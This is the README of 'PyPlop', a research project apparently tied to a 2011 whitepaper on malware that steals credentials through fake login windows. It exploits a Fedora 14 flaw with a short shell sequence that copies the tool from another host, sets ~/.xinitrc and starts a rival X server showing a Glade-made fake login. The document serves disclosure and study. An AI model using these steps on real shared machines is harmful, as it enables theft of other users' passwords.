# PyPlop
This project is part of whitepaper (2011) that exposes a kind of malware used to obtain confidential information by impersonating accreditation windows. The feasibility of this technique is validated with a practical case, which exploits a security flaw in a Linux distribution.

Fedora 14 (Laughlin) was vulnerable to an attack where a normal user could login into a shared machine and start a X server which replaced the current one on the screen. The user could then configure a fake login window so the user using the computer would enter his credentials.

```
ssh mallory@alpha
mallory@alpha’s password:
mallory@alpha:~$ scp -r test@hostX:pyplop/ .pyplop
mallory@alpha:~$ echo "cd .pyplop/ && ./pyplop.py" > ~/.xinitrc
mallory@alpha:~$ startx -- :1
```

The next screenshots correspond to the original login window followed by a fake one build using Glade. It is not perfect, but enough to fake a naive user into entering his credentials.

![Original Login Window](/original_login_window.png)
![Fake Login Window](/fake_login_window.png)
